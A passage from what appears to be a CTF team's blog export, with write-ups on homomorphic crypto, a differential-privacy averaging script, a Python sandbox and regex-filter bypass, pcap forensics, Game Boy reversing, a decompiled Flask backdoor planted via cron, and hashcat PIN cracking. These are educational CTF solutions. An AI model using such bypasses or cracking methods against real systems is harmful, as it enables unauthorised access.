65537&gt;&gt;&gt; d = modinv(e, (p-1)*(q-1))&gt;&gt;&gt; a = pow(554863447144015806910906, d, n)&gt;&gt;&gt; a218624962707346537869456L&gt;&gt;&gt; pow(a**5 + 2*a + 41, e, n)215275919603710085695724L We have our second answer correct. 12345678910n = 659381354716006369742363e = 65537enc(a) = 554863447144015806910906enc(a^5 + 2*a + 41)?215275919603710085695724Correct! Next...n = 776738987646974637425039g = 776738987646974637425040enc(a) = 104466234975614190334351556746005105225005455760enc(a^5)? Now, this looks like Paillier cryptosystem. We used yafu to discover n = p * q. We obtain p = 952658582963 and q = 815338256053. 1234567891011121314151617&gt;&gt;&gt; p = 952658582963&gt;&gt;&gt; q = 815338256053&gt;&gt;&gt; n = p * q&gt;&gt;&gt; g = 776738987646974637425040&gt;&gt;&gt; enc = 104466234975614190334351556746005105225005455760&gt;&gt;&gt; phi = (p-1)*(q-1)&gt;&gt;&gt; miu = modinv((pow(g, phi, n**2)-1)/n, n)# decrypt and find a&gt;&gt;&gt; z = pow(enc, phi, n**2)&gt;&gt;&gt; z = (z - 1)/n&gt;&gt;&gt; a = z*miu % n&gt;&gt;&gt; a593865001407021231568482L# encrypt a^5&gt;&gt;&gt; r = 5 #whatever number&gt;&gt;&gt; (pow(g, a**5, n**2) * pow(r, n, n**2)) % (n**2)551344609697032782258820295222867131320370770770L Correct. Next we find again ElGamal. 1234567891011n = 776738987646974637425039g = 776738987646974637425040enc(a) = 104466234975614190334351556746005105225005455760enc(a^5)?551344609697032782258820295222867131320370770770Correct! Next...q = 162468360679141142763506469479039044723348598131343445023537528281758038856725899813448600764965664562827243890486154155054547681581530078506256454819062823302171522262160978639320056038295558351438333626355253455829930861656788077110705347484186791527605530619097928023950578487542852122604132414043739150119g = 71617122044994067303905663362038925673552248437100144808168324877801061768171815833721974961532703253044394601768959631644002378569370957141698573753120813269172546820898334296643254497348710964283337196775523365259211998702039022625622498418357561295233596431521761773785941196196533383471457791068304542860h = 111066648693171887028924716387930536202901514118903026147266454463707523131763918297711469710662207420385870870164685517351171893585068487655691524361140991885848958718360460992751593253073812391597394918180851967495018510187596343611325247877606623904208279091478507563768905318293335621925954116646006910388enc(a) = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)enc(a^7)? This one is easy. The ElGamal encryption of a is the following. 1E(a) = (g^r mod q, a * h^r mod q) To obtain the encryption of a^7, we elevate E(a) to the power of 7. 1E(a)^7 = ((g^r mod q)^7, (a * h^r mod q)^7) = (g^(7r) mod q, a^7 * h^(7r) mod q) = E(a^7) Therefore: 123456...define q, h, g...&gt;&gt;&gt; enc = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)&gt;&gt;&gt; (pow(enc[0], 7, q), pow(enc[1], 7, q))(111943704492198613677284064414263835827314903408795497288196730523366749172531261312939368180540744924661825776170153157857298436145855968660805139686412343878802804331392369688765040244903208295888020856843171734022924414044150587927040617364297225555547079482268117880403242431146502775006475807941590243957, 146944962972196061304452302982428886923580067615704091332968984386866821167820106942309825648793805501664148988040753726356825992452196561280275962919553230491290426455421904803150216668843887712124953140424115672066452860798980586595286092420270643236030879120858647424877506090672990669173730588282484181475) Correct. The next one is another RSA with the following parameters. 1234n = 116129573369269565162236051660667188158855673329540427297390499575862981989835841843866583577063083766954029063144621040623764875768299287457499920694511048949688694670794953791035923764107936680805021705444041635396218234076099965276137996734996446529395542124683260815237555361324912425749295153953132095761e = 65537enc(a) = 113404819639317667150945206046179254025822100958261129257002960505190359188994098567188808686386964857225447271200495440587539103432162087685650112552863460383570740714408941280241382042752738643406032354358166194009200674868816147437559543328518217678994594982357470461665835857915008170677398859755267093420enc((31*a)^7)? RSA is homomorphic to the multiplication and powers. Just do the following. Encrypt 31. Multiply the encryption of 31 to the encryption of a. (z = E(31) * E(a) % n) Power it. (result = pow(z, 7, n)) Done. result is 79422070142774248998696748364536969928051026241019028333521995212847190464228596819898318295431833653185507986566295081274239311469462993984644730127173443271940560058698451295020485382667406426759092058704807263661852917928725084340240033097368645878075171977767675641790645116925564507723204703462264972052 Next. Another Paillier. 12345n = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654023g = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654024enc(a) = 7937660128690175325568344972823559278861468103813145508603245376730524355646304917359508580566100608589042820651231838238609822717639617861887063282742304194177278580800908754694218555803321746479637321316698926171902620676195782762387943008573984077258721183694556844093549693467565523559928218327284235089enc(b) = 33387753148071257428905539518160221978694704069687353836469091655010096223312256529016397591008817430414577588510555623557614906758093969392417915817764626568693773437705685363505728318306424617495507184665856273528630405473435911817059436953757079883134497707484413544554359132244534862297762773379557525426enc(31*a + 12*b + 56)? Pallier is homomorphic to the addition and the multiplication, in the following way: 12E(m1)^k = E(k*m1)E(m1)E(m2) = E(m1 + m2) The result is:1(pow(E(a),31,n**2) * pow(E(b), 12, n**2)) * E(56) % n**2 = 4970421455367244845374713137266537502697958490590659650451726192347671487410827360664416249739491204023927184480151500339026488270807023596092868579949981952165240250817692006905532570205653975588657894036033054920661457321178863796257037956921744588997061459597410104137746663293674207917309975395301044061 Finally, the flag is given to us:CTF-BR{ASym3tric_partially_Homomorphic_3ncryPt1on}","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://teamrocketist.github.io/tags/RSA/"},{"name":"elgamal","slug":"elgamal","permalink":"https://teamrocketist.github.io/tags/elgamal/"},{"name":"pallier","slug":"pallier","permalink":"https://teamrocketist.github.io/tags/pallier/"},{"name":"discrete log","slug":"discrete-log","permalink":"https://teamrocketist.github.io/tags/discrete-log/"}]},{"title":"Crypto-Pwn2Win-2017-Differential-Privacy","slug":"Crypto-Pwn2Win-2017-Differential-Privacy","date":"2017-10-22T18:59:47.000Z","updated":"2018-10-24T23:21:04.854Z","comments":true,"path":"2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/","excerpt":"","text":"Differential PrivacyIs it possible to have privacy on these days? The Rebelious Fingers do not think so. Get the flag.Server: nc 200.136.213.143 9999 We accessed the service and we try to get the info. 123456789Hello, chose an option:[1] Info[2] Query the flag (in ASCII)[3] Quit1You can query the flag, but the characters are private (indistinguishable).Differential privacy mechanism: LaplaceSensitivity: ||125 - 45|| = 80Epsilon: 6.5 From this information we know that maybe the service is using a differential privacy mechanism to hide the flag. We also know that the mechanism is “Laplace”.After a little research, we found the explanation of the differential privacy mechanism using the Laplace distribution. In this mechanism, the original value is added to a random value that obeys the Laplace distribution. This random value from the Laplace distribution is called laplace noise.The specific laplace distribution used in differential privacy is Laplace(0, sensitivity/epsilon). For more information on the Laplace distribution follow https://en.wikipedia.org/wiki/Laplace_distribution. 1anonymized = original + random_from_laplace We query the flag and obtain: 123456Hello, chose an option:[1] Info[2] Query the flag (in ASCII)[3] Quit2[75, 86, 83, 36, 56, 87, 146, 54, 97, 118, 110, 132, 101, 118, 120, 118, 112, 91, 103, 88, 140, 112, 110, 112, 120, 64, 95, 73, 97, 96, 114, 98, 113, 112, 113, 110, 118] So, maybe, the service is adding laplace noise to the ASCII values (integer) of the flag. If we query again, the values are different: 123456Hello, chose an option:[1] Info[2] Query the flag (in ASCII)[3] Quit2[64, 82, 67, 35, 71, 82, 118, 74, 95, 128, 98, 92, 108, 102, 123, 107, 94, 99, 103, 78, 102, 98, 111, 101, 114, 113, 111, 135, 97, 74, 92, 107, 93, 114, 111, 90, 128] We know that Laplace(0, sensitivity/epsilon) has average 0. So, if we average sufficient anonymized records of the flag, the random noise added will be canceled (because the average of the Laplace is 0), and the original value of the flag is obtained. So, the trick here is to query the flag plenty of times (we queried 10000 times) and average each entry. Here is sample code: from pwn import * def get_list(): r = remote('200.136.213.143', 9999) r.recvline() r.recvline() r.recvline() r.recvline() r.send(\"2\\n\") return eval(r.recvline()) d = [] for i in range(37): d.append(list()) for i in range(10000): if i % 10 == 0: print i l = get_list() for j in range(len(l)): d[j].append(l[j]) for i in range(37): av = sum(d[i]) / len(d[i]) result.append(int(round(av))) print result print \"\".join([chr(c) for c in result]) At the end, we obtain the flag: CTF-BR{I_am_just_filtering_the_noise} EDIT: bug in the source code. Thank you LFChang.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"laplace","slug":"laplace","permalink":"https://teamrocketist.github.io/tags/laplace/"},{"name":"differential","slug":"differential","permalink":"https://teamrocketist.github.io/tags/differential/"}]},{"title":"[Pwn] Pwn2Win - Tokens v2.0","slug":"Pwn-Pwn2Win-Tokens-v2-0","date":"2017-10-22T17:47:30.000Z","updated":"2018-11-06T04:30:04.494Z","comments":true,"path":"2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/","link":"","permalink":"https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/","excerpt":"","text":"Tokens v2.0We have discovered that the upper echelon of Butcher Corp. uses a temporary token generator along with their brain chips as a form of 2FA(Two-Factor Authentication) for their most restricted systems. Our intel team got their source code, but we still haven’t got the seed right. We need you to get it for us, as we’re sure it will be useful for other systems! The name of one of this system’s users is “Dúfa van Tryggvadóttir”, vice president of the company.Source Code:LinkMirrorServer: nc 200.136.213.114 4000Id: tokens_v20Total solves: 22Score: 283Categories: Exploitation This exploitation challenge is about this python script:https://pastebin.com/144yVeZF This challenge has 3 steps to be solved: 1231 - Find a regex that matches &quot;Dúfa van Tryggvadóttir&quot; with some restrictions.2 - Bypass de options checks and run gen function.3 - Bypass the Sand box and print the seed (Which was the flag). Find a regex that matches “Dúfa van Tryggvadóttir” with some restrictions.This is easy even with these restrictions: 1234567limit = 22if len(regex) &gt; limit: print \"What kind of name is yours?\" exit() tmp = re.findall(\"[^A-z+]\", regex)tmp1 = re.findall(\"[\\[\\]]\", regex) The first regex matches every single character not present in the list below [^A-z+]: A-z a single character in the range between A (index _65_) and z (index 122) (case sensitive) + matches the character + literally (case sensitive) The second regex matches every single character present in the list below [\\[\\]]: [ matches the character [ literally (case sensitive) ] matches the character ] literally (case sensitive) So we can use characters from index _65_ to index 122 any others outside this range is forbidden(consult http://www.asciitable.com/index/asciifull.gif) and we can’t user [ or ] and a limit of 22 characters. Our aproach to this step was easy to find something that was equivalent to the . character, which in regex means matching any character except for new line, we have the + character. We used the following regex:If we test this in the binary we can see it worked!: 1234567891011$ nc 200.136.213.114 4000Hello! Log on to the Token Generation SystemIf your name is not on the authorized list, a notification will be generated!For security reasons, NEVER type your literal name.Type your regex-name to identify ([^\\[\\]][A-z+]): D\\D+rHello, Vice-President![Open] - To create a new token[Revoke] - To Revoke a tokenType the option: Bypass de options checks and run gen functionThis is the part of the code we need to analyse: 12345if role == \"President\" and \"Open\" in option or \"Revoke\" in option: authorized = 1else: print \"For now, only the president is allowed to generate tokens.\" exit() The first thing we have to do here is to choose Revoke, we don’t have the Presidents name so if we don’t want to exit the program, there will be a second check: 12345678910111213141516171819202122232425if authorized: print \"\\nFor security reasons, confirme your option!\" option = Option() option_test = re.findall('[\\w]+', option) for s in option_test: if s == \"Open\": print \"Mr. President, enable the option to generate tokens on the server.\" exit() elif s == \"Revoke\": token = raw_input(\"Type your token serial: \").strip() if len(token) &gt; 4 or token.isdigit() != True: print \"Revise your token!\" exit() else: open = file(\"canceled-tokens.txt\", \"a\") time = datetime.now() open.writelines(\"\\nToken canceled at: %02d/%02d/%02d %02d:%02d:%02d:\\n\" % (time.month, time.day, time.year, time.hour, time.minute, time.second)) open.writelines(token) open.close() print \"This will go through by a manual inspection, thank you Mr. \" + role + \"!\" exit() else: print \"Incorrect option, please, try again!\" option = string(option) As we can see above doesn’t matter what we choose we will always exit the program so what we do here? we need to find a trick, to bypass this and still have the option “Open” as we can see in the end they are removing all \\ of the string in the final of the loop: 1234567891011class string(object): def __init__(self, string): self.string = string def strip(self): test = re.findall(r\"[\\\\\\n\\t\\r]\", self.string) for i in test: self.string = self.string.replace(i, \"\") return self.string And the calls:1234 \"Truncated code of the loop\" option = string(option)if option.strip() == \"Open\": gen() This very useful! this removes newlines or \\ characters! The regex expression that splits the string does this: If we inject O\\pen it will match the words O and pen and when we enter in the loop we won’t choose any of the options not exiting the program, after this the string class will help us getting the Open string!If we do this we will run the gen function: 1234567891011121314151617181920212223242526$ nc 200.136.213.114 4000Hello! Log on to the Token Generation SystemIf your name is not on the authorized list, a notification will be generated!For security reasons, NEVER type your literal name.Type your regex-name to identify ([^\\[\\]][A-z+]): D\\D+rHello, Vice-President![Open] - To create a new token[Revoke] - To Revoke a tokenType the option: RevokeFor security reasons, confirme your option![Open] - To create a new token[Revoke] - To Revoke a tokenType the option: O\\penIncorrect option, please, try again!Incorrect option, please, try again!Usage:gen 'token serial number'E.g.:gen 2017&gt;&gt;&gt; Bypass the Sand box and print the seed (Which was the flag)First we have some characters we can’t use: 123456789def validation(input): err = int() input = str(input) nochrs = '[&amp;*+-/34689?\\&lt;_&gt;!@#`|$%;&#123;&#125;]' if re.findall(nochrs, input): err = 1 else: err = 0 if not err: return 1 else: return 0 Analysing the regular expression we have: The characters between the range _43_ and _47_ are: We can’t use any of the characters above and there is more, we can’t use most of the built_in functions because they are being removed here: 1234567def safe(): from sys import modules modules.clear() del modules global input, compile, execfile, globals, vars, open, file, reload, __import__, locals, dir input, compile, execfile, globals, vars, locals, open, file, reload, __import__, dir = None, None, None, None, None, None, None, None, None, None, None __builtins__.dir = None We tried hard to bypass and we couldn’t do it, we knew that we needed to run raw_input(seed) this function would print the seed for us unfortunately the _ character was filtered too, so we found this function within the code: 12345def Option(): print \"[Open] - To create a new token\" print \"[Revoke] - To Revoke a token\" opt = raw_input(\"Type the option: \") return opt This is perfect if we run gen Options() it will run another raw_input without any filters and then we can inject any character we want! Here is the example how to do it:The flag was CTF-BR{fiev4zi3Nais7ue7aiSh}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"Sandbox","slug":"Pwn/Sandbox","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/"},{"name":"Python","slug":"Pwn/Sandbox/Python","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/Python/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"pwn2winctf","slug":"pwn2winctf","permalink":"https://teamrocketist.github.io/tags/pwn2winctf/"},{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"sandbox","slug":"sandbox","permalink":"https://teamrocketist.github.io/tags/sandbox/"},{"name":"regex","slug":"regex","permalink":"https://teamrocketist.github.io/tags/regex/"}]},{"title":"[Forensics] Square CTF - Sniffed Off the Wire","slug":"Forensics-Square-CTF-Sniffed-Off-the-Wire","date":"2017-10-16T18:26:03.000Z","updated":"2018-10-24T23:21:04.858Z","comments":true,"path":"2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/","link":"","permalink":"https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/","excerpt":"","text":"Sniffed Off the Wire🚩Sifting through the noise100 pointsForensicsAfter weeks of perching, our avian operatives captured a suspicious network flow. Maybe there’s valuable data inside?https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap We have pcap analysing it in wireshark, if we follow the tcp stream we can see alot of strange characters:This strange characters are known as terminal characters, they can do alot of things like changing the color printed in the terminal and do alot of other stuff. If we print some characters like this in the terminal with c/python/perl/ruby etc: 12345678910class bcolors: HEADER = '\\033[95m' with OKBLUE = '\\033[94m' OKGREEN = '\\033[92m' WARNING = '\\033[93m' FAIL = '\\033[91m' ENDC = '\\033[0m' BOLD = '\\033[1m' UNDERLINE = '\\033[4m'print bcolors.WARNING + \"Warning: No active frommets remain. Continue?\" + bcolors.ENDC It’s going to print the text as yellow in the terminal, those characters on wireshark will do same but with another functions not just changing the color, first we need to decode all this hex decimal in the data field of each TCP package:Lets use bash to get all the hexadecimal and convert it to text: 1tshark -r sniffed-off-the-wire.pcap -Y \"data\" -Tfields -e data.data | tr -d ':|\\n' | xxd -r -p Those characters are actually writing the flag and then delete it, I actually needed to print-screen the terminal, with this I ended up getting the flag:","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"wireshark","slug":"wireshark","permalink":"https://teamrocketist.github.io/tags/wireshark/"},{"name":"tshark","slug":"tshark","permalink":"https://teamrocketist.github.io/tags/tshark/"},{"name":"terminal_characters","slug":"terminal-characters","permalink":"https://teamrocketist.github.io/tags/terminal-characters/"},{"name":"squarectf","slug":"squarectf","permalink":"https://teamrocketist.github.io/tags/squarectf/"}]},{"title":"[Reverse] Square CTF - The Turing Agent","slug":"Reverse-Square-CTF-The-Turing-Agent","date":"2017-10-16T00:08:25.000Z","updated":"2018-10-24T23:21:04.854Z","comments":true,"path":"2017/10/16/Reverse-Square-CTF-The-Turing-Agent/","link":"","permalink":"https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/","excerpt":"","text":"The Turing AgentA Small Gameboy CTF500 pointsReverseThe hamsters have triumphed! We found an open Github repository (https://github.com/Ahris/the_turing_agent)! It looks like some sort of game; perhaps they’re planning to trick our humans into playing it. We need to know if there’s any data hidden in the game that might harm our humans.Note: You’ll need to prepend “flag-“ to the flag. A game boy classic rom to analyse, at first I tried to search in the web for a nice debugger for this and most people online were recommending to use http://bgb.bircd.org/ classifying it as the best, well unfortunately I didn’t manage to understand this debugger very well so once again searching in the web I found a much more intuitive debugger named No$GMB (http://problemkaputt.de/gmb.htm) with this one it was much easier to solve the challenge. Opening the rom with No$GMB we can see that the game starts we get some conversation until we reach a locked door which requires a code (combination of multiple gameboy keys), if we get the correct combination we can get the flag: As you can see in the image above I put a break point at 0x337C which is a jump, I did a break point here because I noticed its some kind of a loop which will only end when all the keys are inserted to unlock the door so my plan was not to actually understand how the architecture of the gameboy works but to try to bypass the combination verification by changing the flags of jump instructions and try to find the winner function:To avoid being stuck in the loop without pressing any keys we can just disable the carry flag and it will not jump as we can see in the image bellow the “[]” disappears:This is how I manipulated the game, by changing the control flow of the program to try to jump into a winner function, after multiple steps I ended up in the final road to finish the challenge as you can see bellow:By going to the next lines of the conversation we got the flag:","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"squarectf","slug":"squarectf","permalink":"https://teamrocketist.github.io/tags/squarectf/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"gameboy","slug":"gameboy","permalink":"https://teamrocketist.github.io/tags/gameboy/"},{"name":"no$gmb","slug":"no-gmb","permalink":"https://teamrocketist.github.io/tags/no-gmb/"}]},{"title":"[Reverse] Kaspersky Industrial CTF Quals 2017 - Backdoor Pi","slug":"Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi","date":"2017-10-08T15:00:48.000Z","updated":"2018-10-24T23:21:04.854Z","comments":true,"path":"2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/","link":"","permalink":"https://teamrocketist.github.io/2017/10/08/Reverse-Kaspersky-Industrial-CTF-Quals-2017-Backdoor-Pi/","excerpt":"","text":"We are doing an project for a school competition in which we need to use a Raspberry Pi to make an IOT prototype. We received SD cards from the professor, and because we lost ours we asked another group to give us a copy of their card, I know it’s been modified because the original hash doesn’t match. Could you please investigate and tell me if everything is ok? Here is some parts of the file system:FLAG FORMAT: KLCTF{flag}download this file: https://s3.eu-central-1.amazonaws.com/klctf/fs.zip By reading the description we know the attacker added some kind of backdoor our first intuition was to check the crontab files: 12$ ls var/spool/cron/crontabs/b4ckd00r_us3r pi By checking the b4ckd00r_us3r we found out the backdoor is running in this cron task: 123456cat var/spool/cron/crontabs/b4ckd00r_us3r # DO NOT EDIT THIS FILE - edit the master and reinstall.# (/tmp/crontab.80NKS4/crontab installed on Wed Oct 4 19:28:12 2017)# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)# m h dom mon dow command@reboot python /bin/back By checking what kind of file /bin/back is: 12$ file bin/backbin/back: python 2.7 byte-compiled It’s a python compiled file we used https://github.com/wibiti/uncompyle2 to uncompyle and we got this: 123456789101112131415161718192021222324252627282930313233343536373839# uncompyle6 version 2.12.0# Python bytecode 2.7 (62211)# [GCC 6.3.0 20170118]# Embedded file name: back.py# Compiled at: 2017-10-05 09:09:10import sysimport osimport timefrom flask import Flaskfrom flask import requestfrom flask import abortimport hashlibdef check_creds(user, pincode): if len(pincode) &lt;= 8 and pincode.isdigit(): val = '&#123;&#125;:&#123;&#125;'.format(user, pincode) key = hashlib.sha256(val).hexdigest() if key == '34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e': return 'Congr4ts, you found the b@ckd00r. The fl4g is simply : &#123;&#125;:&#123;&#125;'.format(user, pincode) return abort(404)app = Flask(__name__)@app.route('/')def hello(): return '&lt;h1&gt;HOME&lt;/h1&gt;'@app.route('/backdoor')def backdoor(): user = request.args.get('user') pincode = request.args.get('pincode') return check_creds(user, pincode)if __name__ == '__main__': app.run(threaded=True, host='0.0.0.0', port=3333)# okay decompiling back.pyc We have a hash and we know it is composed in the following format: 1user:pincode Checking the user in /etc/passwd 12345678910111213141516171819202122232425262728root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shpi:x:1000:1000:,,,:/home/pi:/bin/bashsshd:x:101:65534::/var/run/sshd:/usr/sbin/nologinntp:x:102:104::/home/ntp:/bin/falsestatd:x:103:65534::/var/lib/nfs:/bin/falsemessagebus:x:104:106::/var/run/dbus:/bin/falseusbmux:x:105:46:usbmux daemon,,,:/home/usbmux:/bin/falselightdm:x:106:109:Light Display Manager:/var/lib/lightdm:/bin/falseavahi:x:107:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falseb4ckd00r_us3r:x:1001:1004::/home/b4ckd00r_us3r:/bin/bash The user is b4ckd00r_us3r we just need to bruteforce the pincode by looking at the code we know the pincode must be between 1 and 8 numbers using hashcat to crack the hash: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647$ cat kasperskyhash 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e$ cat example.dict b4ckd00r_us3r:$ hashcat -D 1,2 -m 1400 -a 6 -i --increment-min 1 --increment-max 8 kasperskyhash example.dict \"?d?d?d?d?d?d?d?d\"Session..........: hashcat Status...........: ExhaustedHash.Type........: SHA-256Hash.Target......: 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf22...ff222eTime.Started.....: Sun Oct 8 16:23:46 2017 (3 mins, 27 secs)Time.Estimated...: Sun Oct 8 16:27:13 2017 (0 secs)Guess.Base.......: File (example.dict), Left SideGuess.Mod........: Mask (?d?d?d?d?d?d?d) [7], Right SideGuess.Queue.Base.: 1/1 (100.00%)Guess.Queue.Mod..: 7/8 (87.50%)Speed.Dev.#1.....: 45759 H/s (0.29ms)Speed.Dev.#2.....: 0 H/s (0.00ms)Speed.Dev.#*.....: 45759 H/sRecovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) SaltsProgress.........: 10000000/10000000 (100.00%)Rejected.........: 0/10000000 (0.00%)Restore.Point....: 0/1 (0.00%)Candidates.#1....: b4ckd00r_us3r:8939393 -&gt; b4ckd00r_us3r:9579393Candidates.#2....: [Copying]HWMon.Dev.#1.....: Temp: 64c Fan: 46%HWMon.Dev.#2.....: N/ADictionary cache hit:* Filename..: example.dict* Passwords.: 1* Bytes.....: 15* Keyspace..: 100000000- Device #2: autotuned kernel-accel to 160 - Device #2: autotuned kernel-loops to 204- Device #1: autotuned kernel-accel to 22 - Device #1: autotuned kernel-loops to 23[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =&gt; The wordlist or mask that you are using is too small.This means that hashcat cannot use the full parallel power of your device(s).Unless you supply more work, your cracking speed will drop.For tips on supplying more work, see: https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted. 34c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:$HEX[6234636b643030725f757333723a3132313731333337]$ cat ~/.hashcat/hashcat.potfile | tail -134c05015de48ef10309963543b4a347b5d3d20bbe2ed462cf226b1cc8fff222e:$HEX[6234636b643030725f757333723a3132313731333337] After a while it cracks, hashcat outputs the password in hex so lets decode it with bash: 12$ echo '6234636b643030725f757333723a3132313731333337' | xxd -r -pb4ckd00r_us3r:12171337 The flag was 1KLCTF&#123;b4ckd00r_us3r:12171337&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"hashcat","slug":"hashcat","permalink":"https://teamrocketist.github.io/tags/hashcat/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"compiled","slug":"compiled","permalink":"https://teamrocketist.github.io/tags/compiled/"},{"name":"sha256","slug":"sha256","permalink":"https://teamrocketist.github.io/tags/sha256/"},{"name":"kasperskyCtf","slug":"kasperskyCtf","permalink":"https://teamrocketist.github.io/tags/kasperskyCtf/"}]},{"title":"[Reverse] BackdoorCTF 2017 - NO-CALM","slug":"Reverse-BackdoorCTF-2017-NO-CALM","date":"2017-09-26T11:09:07.000Z","updated":"2018-10-24T23:21:04.850Z","comments":true,"path":"2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/","link":"","permalink":"https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/","excerpt":"","text":"Reverse challenge, using IDA to convert the binary into c pseudo code: We can see that the flag must be in the arguments of the flag, each byte of the flag will be an argv, the flag has 31 bytes as we can see in if check. Looking at the generated code we can see that each byte of the flag is being saved from the variable v6 to v35. After this we can see a bunch of if verifications:We can see it checks 3 bytes at time, with 3 different operation checks: 1(v7+v6-v8 == key[0] &amp;&amp; v6-v7+v8 == key[1] &amp;&amp; v7-v6+v8 == key[2]) == true And this repeats for all 3 bytes along the flag… it’s simple to write a python script to brute force the flag: 12345678910111213import stringa = string.printablekeys = [81,53,87,90,156,66,98,140,92,38,170,60,29,161,69,163,27,69,147,43,59,146,86,44,67,89,75,117,125,125]flags = []s = ''for i in range(0,len(keys),3): for b in a: for c in a: for d in a: if ord(c)+ord(b)-ord(d) == keys[i] and ord(b)-ord(c)+ord(d) == keys[i+1] and ord(c)-ord(b)+ord(d) == keys[i+2]: s += b+c+d print s Running it: 1234567891011$ python nocalm.py CTFCTF&#123;NoCTF&#123;Now_tCTF&#123;Now_th1sCTF&#123;Now_th1s_1sCTF&#123;Now_th1s_1s_t0CTF&#123;Now_th1s_1s_t0_g3CTF&#123;Now_th1s_1s_t0_g3t_ACTF&#123;Now_th1s_1s_t0_g3t_ANGRCTF&#123;Now_th1s_1s_t0_g3t_ANGRyy&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"backdoorctf","slug":"backdoorctf","permalink":"https://teamrocketist.github.io/tags/backdoorctf/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"}]},{"title":"[Pwn] BackdoorCTF 2017 - 